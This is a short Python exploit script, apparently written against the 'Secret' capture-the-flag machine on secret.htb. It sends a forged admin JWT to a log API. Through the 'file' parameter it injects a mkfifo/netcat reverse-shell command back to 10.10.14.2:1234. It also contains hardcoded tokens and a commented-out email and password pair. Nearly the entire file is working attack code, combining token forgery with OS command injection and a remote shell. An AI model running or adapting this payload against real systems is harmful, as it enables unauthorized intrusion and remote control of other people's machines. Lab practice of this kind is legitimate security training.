#! /usr/bin/python3	


import requests
import json

register_url="http://secret.htb:3000/api/user/register"
login_url="http://secret.htb:3000/api/user/login"
priv_url="http://secret.htb:3000/api/logs?file=;rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash+-i+2>%261|nc+10.10.14.2+1234+>/tmp/f"
#data={"email": "root@dasith.works","password": "Kekc8swFgD6zU"}



register_data={"name": "tested","email": "test@test.com","password": "tested"}
login_data={"email": "test@test.com","password": "tested"}
headers={"auth-token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWVhOWI3OTdiZTQ2NjA0NWU5NDNjYTUiLCJuYW1lIjoidGVzdGVkIiwiZW1haWwiOiJ0ZXN0QHRlc3QuY29tIiwiaWF0IjoxNjQyNzgwNTkwfQ.HzcrBovGTyPYl_9wzcJ7BnxiBmGvpHklyB0ELyvBsuo"}
mal_headers={"auth-token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI2MWVhOWI3OTdiZTQ2NjA0NWU5NDNjYTUiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJpYXQiOjE2NDI3ODA1OTB9.jjqfx4uPEnq6QfO4ZlMga2dZLssaWswhfGXpBZW5i-A"}
#proxies={"http":"http://10.10.11.120:80"}

#json_data = json.dumps(data, ensure_ascii=True)
#r=requests.post(url,data=json_data,proxies=proxies)


#r=requests.post(login_url,json=login_data)
r=requests.get(priv_url,headers=mal_headers)


print(r.text)
